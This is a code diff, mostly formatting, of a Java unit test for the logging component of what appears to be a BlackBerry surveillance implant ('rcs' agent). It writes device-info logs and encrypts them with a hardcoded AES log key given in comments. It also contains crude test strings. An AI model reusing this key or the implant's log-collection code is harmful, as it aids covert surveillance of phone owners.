@@ -1,8 +1,5 @@
 package com.ht.tests.unit;
 
-import java.io.UnsupportedEncodingException;
-
-import com.ht.rcs.blackberry.AgentManager;
 import com.ht.rcs.blackberry.Common;
 import com.ht.rcs.blackberry.Device;
 import com.ht.rcs.blackberry.Status;
@@ -19,7 +16,6 @@ import com.ht.tests.AssertException;
 import com.ht.tests.TestUnit;
 import com.ht.tests.Tests;
 
-
 public class UT_Log extends TestUnit {
 
 	public UT_Log(String name, Tests tests) {
@@ -27,9 +23,9 @@ public class UT_Log extends TestUnit {
 	}
 
 	public boolean run() throws AssertException {
-		
+
 		LogCollector.getInstance().makeLogDirs(true);
-		
+
 		CreatePlainDeviceLog();
 		CreateEncDeviceLog();
 		CreateDeviceAgent();
@@ -39,66 +35,69 @@ public class UT_Log extends TestUnit {
 	private void CreatePlainDeviceLog() {
 		Status status = Status.getInstance();
 		status.Clear();
-		
-		Agent agent = Agent.Factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED, null);
-		
+
+		Agent agent = Agent.Factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED,
+				null);
+
 		Log agentLog = LogCollector.getInstance().LogFactory(agent, true);
-		
+
 		// agent device vuoto
 		byte[] additionalData = null;
 		byte[] plain = agentLog.makeDescription(additionalData);
-		
+
 		Check.asserts(plain.length == 32, "Wrong len 1 ");
-		
-		AutoFlashFile file = new AutoFlashFile(Path.SDPath + "LOG_test1.log", false);
-		if(file.exists())
+
+		AutoFlashFile file = new AutoFlashFile(Path.SDPath + "LOG_test1.log",
+				false);
+		if (file.exists())
 			file.delete();
 		file.create();
-		
+
 		file.append(plain.length);
 		file.append(plain);
-		
+
 		// agent device con imsi ecc
 		Device device = Device.getInstance();
 		device.refreshData();
-		
+
 		plain = agentLog.makeDescription(additionalData);
 		Check.asserts(plain.length > 32, "Wrong len 2");
-		
-		 file = new AutoFlashFile(Path.SDPath + "LOG_test2.log", false);
-		if(file.exists())
+
+		file = new AutoFlashFile(Path.SDPath + "LOG_test2.log", false);
+		if (file.exists())
 			file.delete();
 		file.create();
-		
+
 		file.append(plain.length);
-		file.append(plain);		
-		
+		file.append(plain);
+
 		String chunk = "Processore: Cray\nMemoria: a paccazzi\nOS: BB\nKiodo: gay\n";
 		byte[] bc = WChar.getBytes(chunk);
-		
+
 		// chunk, a pezzi
 		file.append(bc);
-		
+
 		// resto del chunk: 4*2 + 2
-		byte[] picche = new byte[]{0x60, 0x26};
-		byte[] fiori = new byte[]{0x61, 0x26};
-		byte[] cuori = new byte[]{0x62, 0x26};
-		byte[] quadri = new byte[]{0x63, 0x26};
+		byte[] picche = new byte[] { 0x60, 0x26 };
+		byte[] fiori = new byte[] { 0x61, 0x26 };
+		byte[] cuori = new byte[] { 0x62, 0x26 };
+		byte[] quadri = new byte[] { 0x63, 0x26 };
 		file.append(picche);
 		file.append(fiori);
 		file.append(cuori);
 		file.append(quadri);
-		
-		file.append( WChar.getBytes("\n"));
-		
+
+		file.append(WChar.getBytes("\n"));
+
 		// secondo chunk in arabo
-		String ArabicText="44062706200023064E062A064E0643064E0644064E06510645064F06200027064406520639064E0631064E0628064A064E06510629064E06";
-		String ArabicTraslitteration="\nTraslitterazione: a atakallamu al-'arabi'yah";
-		String ArabicTranslation="\nmettete la salsa bianca nel kebab\n";	
-		
+		String ArabicText = "44062706200023064E062A064E0643064E0644064E06510645064F06200027064406520639064E0631064E0628064A064E06510629064E06";
+		String ArabicTraslitteration = "\nTraslitterazione: a atakallamu al-'arabi'yah";
+		String ArabicTranslation = "\nmettete la salsa bianca nel kebab\n";
+
 		byte[] arabic = Utils.HexStringToByteArray(ArabicText);
-		int len = arabic.length + ArabicTraslitteration.length() *2 + ArabicTranslation.length() *2;
-		//file.Append(len);
+		int len = arabic.length + ArabicTraslitteration.length() * 2
+				+ ArabicTranslation.length() * 2;
+		// file.Append(len);
 		file.append(arabic);
 		file.append(WChar.getBytes(ArabicTraslitteration));
 		file.append(WChar.getBytes(ArabicTranslation));
@@ -106,46 +105,50 @@ public class UT_Log extends TestUnit {
 	}
 
 	private void CreateEncDeviceLog() {
-		
+
 		// per la 296, logKey = s06El1fQksievo4rtX3XjHWe4lqgxBpZ
 		// md5(logKey) = 4e400a3552be73aedb88077cef404314
-		
-		byte[] logKey = Utils.HexStringToByteArray("4e400a3552be73aedb88077cef404314");
+
+		byte[] logKey = Utils
+				.HexStringToByteArray("4e400a3552be73aedb88077cef404314");
 		Keys.byteAesKey = logKey;
 		Check.asserts(logKey.length == 16, "Wrong md5");
-		
+
 		Status status = Status.getInstance();
 		status.Clear();
-		
-		Agent agent = Agent.Factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED, null);		
+
+		Agent agent = Agent.Factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED,
+				null);
 		Log agentLog = LogCollector.getInstance().LogFactory(agent, true);
-		
+
 		agentLog.createLog(null);
-		
+
 		String content = "BlackBerry 8300\n128Kb Ram installed";
-		agentLog.writeLog(content,true);
-				
+		agentLog.writeLog(content, true);
+
 		agentLog.close();
-		
+
 	}
-	
+
 	private void CreateDeviceAgent() {
-		
+
 		// per la 296, logKey = s06El1fQksievo4rtX3XjHWe4lqgxBpZ
 		// md5(logKey) = 4e400a3552be73aedb88077cef404314
-		
-		byte[] logKey = Utils.HexStringToByteArray("4e400a3552be73aedb88077cef404314");
+
+		byte[] logKey = Utils
+				.HexStringToByteArray("4e400a3552be73aedb88077cef404314");
 		Keys.byteAesKey = logKey;
 		Check.asserts(logKey.length == 16, "Wrong md5");
-		
+
 		Status status = Status.getInstance();
 		status.Clear();
-		
-		Agent agent = Agent.Factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED, null);		
-			
+
+		Agent agent = Agent.Factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED,
+				null);
+
 		agent.Command = Common.AGENT_STOP;
 		agent.AgentRun();
-		
+
 		debug.trace("Agent Device ok");
 	}
 }
